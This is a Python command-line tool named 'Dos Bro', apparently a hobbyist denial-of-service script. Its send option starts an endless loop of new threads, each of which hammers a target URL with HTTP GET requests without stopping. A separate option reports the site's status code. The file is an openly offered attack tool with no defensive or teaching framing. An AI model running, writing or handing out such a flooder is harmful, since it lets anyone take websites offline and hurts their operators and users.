import requests
import pyfiglet
import threading
import sys

RED = "\033[91m"
lenth_of_args = len(sys.argv)

def Dashboard():
    text = pyfiglet.figlet_format("Dos Bro",font="slant")
    print(RED+text)

def help(current_usage):
    print("-v or --version        \t: To print version of the tool")
    print("-h or --help           \t: To print the help of the tool")
    print("-s[url] or --send[url] \t: put the targeted website")
    print("-sc[url] or --statuscode[url] : To get the current status of the website")
    print("\nUsage :"+current_usage)

def status_code(url):
    statuscode = requests.get(url)
    
    if statuscode.status_code == 200:
        print("Current website status : OK")
    elif statuscode.status_code == 400:
        print("Current website status : BAD REQUEST")
    elif statuscode.status_code == 403:
        print("Current website status : FORBIDDEN")
    elif statuscode.status_code == 404:
        print("Current website status : NOT FOUND ERROR")
    elif statuscode.status_code == 500:
        print("Current website status : INTERNAL SERVER ERROR")
    elif statuscode.status_code == 503:
        print("Current website status : SERVICE UNAVILABLE")
    else:
        print("Sorry Cant fetch data temprorily")


def SpawnReq(website_name):
    while True:
        requests.get(website_name)

def SpawnUnlimited(get_web):
    Dashboard()
    print('\n')
    while True:
        threading.Thread(target=SpawnReq,args=(get_web,)).start()

def main():
    if lenth_of_args == 1:
        Dashboard()

    elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
        help(sys.argv[0])

    elif sys.argv[1] == "-s" or sys.argv[1] == "--send":
        if lenth_of_args < 1:
            print("-s[url] or --send[url] : put the targeted website")
            exit(1)
        else:
            print("while sending...\n")
            SpawnUnlimited(sys.argv[2])
    elif sys.argv[1] == "-v" or sys.argv[1] == "--version":
        Dashboard()
        print("Dos Bro v1.0")
    elif sys.argv[1] == "-sc" or sys.argv[1] == "--statuscode":
        if lenth_of_args < 1:
            print("-sc[url] or --statuscode[url] : put the targeted website")
            exit(1)
        else:
            status_code(sys.argv[2])
    else:
        help(sys.argv[0])
        exit(1)

if __name__ == "__main__":
    main()